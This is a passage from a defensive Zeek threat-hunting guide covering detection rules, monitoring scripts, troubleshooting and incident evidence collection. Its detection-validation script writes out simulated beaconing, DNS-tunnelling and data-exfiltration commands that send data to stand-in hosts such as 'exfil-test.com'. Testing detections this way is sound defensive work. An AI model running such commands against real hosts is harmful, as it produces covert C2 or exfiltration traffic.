alert tcp any any -> any any (msg:"Large Data Transfer Detected"; dsize:>1000000; threshold:type both, track by_src, count 1, seconds 60; sid:1000003; rev:1;)

# Suspicious TLS certificates
alert tcp any any -> any 443 (msg:"Suspicious TLS Certificate"; tls_cert_subject; content:"CN="; pcre:"/CN=[a-f0-9]{20,}/"; sid:1000004; rev:1;)
EOF
```

---

## Continuous Monitoring Setup

### Real-Time Alerting

**Rsyslog Integration**
```bash
# Configure rsyslog for Zeek log forwarding
cat > /etc/rsyslog.d/99-zeek.conf << 'EOF'
# Forward Zeek logs to SIEM
$ModLoad imfile
$InputFilePollInterval 1

# Notice log monitoring
$InputFileName /opt/zeek/logs/current/notice.log
$InputFileTag zeek-notice:
$InputFileStateFile stat-zeek-notice
$InputFileSeverity info
$InputFileFacility local0
$InputRunFileMonitor

# Connection log monitoring for high-value alerts
$InputFileName /opt/zeek/logs/current/conn.log
$InputFileTag zeek-conn:
$InputFileStateFile stat-zeek-conn
$InputFileSeverity info
$InputFileFacility local1
$InputRunFileMonitor

# Forward to SIEM
*.* @@siem.company.com:514
EOF

systemctl restart rsyslog
```

**Real-Time Processing Pipeline**
```bash
#!/bin/bash
# real_time_monitor.sh

# Named pipe for real-time processing
mkfifo /tmp/zeek_realtime

# Start Zeek in real-time mode
zeek -i eth0 LogAscii::use_json=T > /tmp/zeek_realtime &

# Real-time alert processor
while read line; do
    # Parse JSON log entry
    event_type=$(echo "$line" | jq -r '._path // empty')
    
    case "$event_type" in
        "conn")
            # Check for suspicious connections
            orig_bytes=$(echo "$line" | jq -r '.orig_bytes // 0')
            duration=$(echo "$line" | jq -r '.duration // 0')
            
            # High bandwidth transfer alert
            if (( $(echo "$orig_bytes > 10000000" | bc -l) )); then
                echo "ALERT: Large data transfer detected" | logger -t THREAT_HUNT
                echo "$line" | jq . >> /var/log/threats/large_transfers.log
            fi
            ;;
        "dns")
            # Check for suspicious DNS queries
            query=$(echo "$line" | jq -r '.query // empty')
            
            # Long domain name (potential tunneling)
            if [ ${#query} -gt 50 ]; then
                echo "ALERT: Suspicious long DNS query: $query" | logger -t THREAT_HUNT
                echo "$line" | jq . >> /var/log/threats/dns_tunneling.log
            fi
            ;;
        "notice")
            # All notices are potential alerts
            note=$(echo "$line" | jq -r '.note // empty')
            echo "ZEEK_NOTICE: $note" | logger -t THREAT_HUNT
            echo "$line" | jq . >> /var/log/threats/zeek_notices.log
            ;;
    esac
done < /tmp/zeek_realtime
```

### Health Monitoring

**Monitoring Script**
```bash
#!/bin/bash
# monitor_health.sh

LOG_DIR="/opt/zeek/logs/current"
ALERT_EMAIL="soc@company.com"

# Check if Zeek is running
if ! pgrep -x "zeek" > /dev/null; then
    echo "CRITICAL: Zeek process not running" | mail -s "Zeek Down" $ALERT_EMAIL
    exit 1
fi

# Check log file sizes (detect potential issues)
for log in conn.log dns.log http.log; do
    if [ -f "$LOG_DIR/$log" ]; then
        size=$(stat -c%s "$LOG_DIR/$log")
        # If log is smaller than 1KB after 5 minutes, something's wrong
        if [ $size -lt 1024 ]; then
            age=$(( $(date +%s) - $(stat -c%Y "$LOG_DIR/$log") ))
            if [ $age -gt 300 ]; then
                echo "WARNING: $log appears to have stopped growing" | \
                mail -s "Zeek Log Issue" $ALERT_EMAIL
            fi
        fi
    fi
done

# Check disk space
disk_usage=$(df /opt/zeek/logs | tail -1 | awk '{print $5}' | sed 's/%//')
if [ $disk_usage -gt 90 ]; then
    echo "CRITICAL: Zeek logs directory is $disk_usage% full" | \
    mail -s "Disk Space Alert" $ALERT_EMAIL
fi

# Check for capture loss
if [ -f "$LOG_DIR/capture_loss.log" ]; then
    loss_count=$(wc -l < "$LOG_DIR/capture_loss.log")
    if [ $loss_count -gt 0 ]; then
        echo "WARNING: $loss_count packet capture losses detected" | \
        mail -s "Packet Loss Alert" $ALERT_EMAIL
    fi
fi
```

---

## Common Pitfalls & Troubleshooting

### Data Quality Issues

**Timestamp Synchronization**
```bash
# Check for time drift across logs
find /opt/zeek/logs -name "*.log" -exec basename {} \; | sort | uniq | \
while read logtype; do
    echo "=== $logtype ==="
    find /opt/zeek/logs -name "$logtype" -exec head -1 {} \; | \
    zeek-cut ts | sort | uniq -c
done

# Detect large time gaps
cat conn.log | zeek-cut ts | sort -n | \
awk '{if(prev && ($1-prev)>3600) print "Gap of " ($1-prev) " seconds at " strftime("%Y-%m-%d %H:%M:%S", $1); prev=$1}'
```

**Missing Data Detection**
```bash
# Check for sequence gaps in UIDs
cat conn.log | zeek-cut uid | sort | \
awk -F'[A-Za-z]' '{print $2}' | sort -n | \
awk '{if(prev && ($1-prev)>1) print "UID gap: " prev " to " $1; prev=$1}'

# Verify log rotation integrity
ls -la /opt/zeek/logs/*/conn.log | \
awk '{print $5, $9}' | sort -k1 -n | \
awk '{if(prev_size && $1 < prev_size*0.1) print "Possible incomplete rotation: " $2; prev_size=$1}'
```

### Performance Optimization

**Memory Usage Optimization**
```bash
# Monitor Zeek memory usage
ps aux | grep zeek | awk '{sum+=$6} END {print "Zeek memory usage: " sum/1024 " MB"}'

# Optimize table sizes in Zeek configuration
cat > zeek_tuning.zeek << 'EOF'
# Reduce memory usage for high-traffic environments
redef table_expire_interval = 10min;
redef ConnThreshold::bytes_threshold = 1048576;
redef ConnThreshold::duration_threshold = 1hr;

# Limit connection state tracking
redef likely_server_ports += { 8080/tcp, 8443/tcp, 9200/tcp };

# Reduce DNS cache size
redef DNS::max_pending_queries = 1000;
EOF
```

**Storage Optimization**
```bash
# Compress old logs automatically
find /opt/zeek/logs -name "*.log" -mtime +1 -not -name "current*" -exec gzip {} \;

# Partition logs by day for easier management
mkdir -p /opt/zeek/logs/$(date +%Y%m%d)
ln -sfn /opt/zeek/logs/$(date +%Y%m%d) /opt/zeek/logs/current

# Implement log retention policy
find /opt/zeek/logs -type d -mtime +30 -exec rm -rf {} \;
```

---

## Validation & Quality Assurance

### Detection Validation

**Red Team Exercise Validation**
```bash
# Validate detection capabilities with known attack patterns
cat > validate_detections.sh << 'EOF'
#!/bin/bash

# Test 1: Beaconing detection
echo "Testing beaconing detection..."
for i in {1..20}; do
    curl -s http://test-c2-server.com/beacon > /dev/null
    sleep 60
done

# Test 2: DNS tunneling detection  
echo "Testing DNS tunneling detection..."
for i in {1..10}; do
    nslookup $(echo "test data $i" | base64).tunnel.example.com
    sleep 30
done

# Test 3: Large data transfer
echo "Testing data exfiltration detection..."
dd if=/dev/urandom bs=1M count=100 | curl -T - http://exfil-test.com/upload

echo "Validation complete. Check logs for alerts."
EOF

chmod +x validate_detections.sh
```

**False Positive Analysis**
```bash
# Analyze false positive rates
cat alerts.log | \
awk '{alerts[$1]++} END {for(alert in alerts) print alert, alerts[alert]}' | \
sort -k2 -nr > alert_frequency.txt

# Whitelist generation for common false positives
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | \
grep -E "(backup|update|monitoring)" | \
awk '{print $1, $2, $3}' | sort | uniq > whitelist_candidates.txt
```

### Metrics & KPIs

**Detection Effectiveness Metrics**
```bash
# Calculate detection coverage
total_connections=$(cat conn.log | wc -l)
analyzed_connections=$(cat analyzed_connections.log | wc -l)
detection_rate=$(echo "scale=2; $analyzed_connections * 100 / $total_connections" | bc)

echo "Detection Coverage: $detection_rate%"

# Mean Time to Detection (MTTD)
cat incident_timeline.log | \
awk '/ATTACK_START/ {start=$1} /DETECTION/ {detect=$1; print detect-start}' | \
awk '{sum+=$1; count++} END {print "Average MTTD:", sum/count " seconds"}'

# Alert quality metrics
true_positives=$(grep "CONFIRMED" alerts.log | wc -l)
false_positives=$(grep "FALSE_POSITIVE" alerts.log | wc -l)
precision=$(echo "scale=2; $true_positives * 100 / ($true_positives + $false_positives)" | bc)

echo "Alert Precision: $precision%"
```

---

## Quick Reference Cards

### Emergency Response Checklist

**Immediate Actions (First 15 minutes)**
- [ ] Isolate affected systems from network
- [ ] Preserve current network logs
- [ ] Identify scope of compromise
- [ ] Notify incident response team
- [ ] Begin evidence collection

**Evidence Collection Commands**
```bash
# Capture current network state
ss -tuln > current_connections_$(date +%s).txt
netstat -rn > routing_table_$(date +%s).txt
arp -a > arp_table_$(date +%s).txt

# Start packet capture on affected interface
tcpdump -i eth0 -w incident_$(date +%s).pcap &
TCPDUMP_PID=$!

# Collect recent Zeek logs
tar -czf zeek_logs_$(date +%s).tar.gz /opt/zeek/logs/current/
```

### Command Quick Reference

**Most Used Zeek Filters**
```bash
# Top 10 external connections
cat conn.log | zeek-cut id.resp_h | grep -vE "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" | sort | uniq -c | sort -nr | head -10

# DNS queries by frequency
cat dns.log | zeek-cut query | sort | uniq -c | sort -nr | head -20

# HTTP POST requests
cat http.log | zeek-cut id.orig_h method uri | grep POST | head -20

# Large file transfers
cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes | awk '$3>1000000' | sort -k3 -nr | head -10

# Authentication failures
cat ssh.log ntlm.log 2>/dev/null | zeek-cut id.orig_h auth_success | grep F | cut -f1 | sort | uniq -c | sort -nr
```

---

## References & Training Resources

### Official Documentation
- **Zeek Documentation**: https://docs.zeek.org/
- **Wireshark User Guide**: https://www.wireshark.org/docs/wsug_html_chunked/
- **NIST SP 800-94**: Guide to Intrusion Detection and Prevention Systems (IDPS)
- **SANS ICS515**: Active Defense and Incident Response

### Threat Intelligence Sources
- **MITRE ATT&CK**: https://attack.mitre.org/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
- **CISA Known Exploited Vulnerabilities**: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### Training & Certifications
- **Free Resources**:
  - Security Onion Documentation
  - Malware-Traffic-Analysis.net
  - Zeek Training Exercises
- **Commercial Training**:
  - SANS FOR572 (Advanced Network Forensics)
  - SANS FOR578 (Cyber Threat Intelligence)

---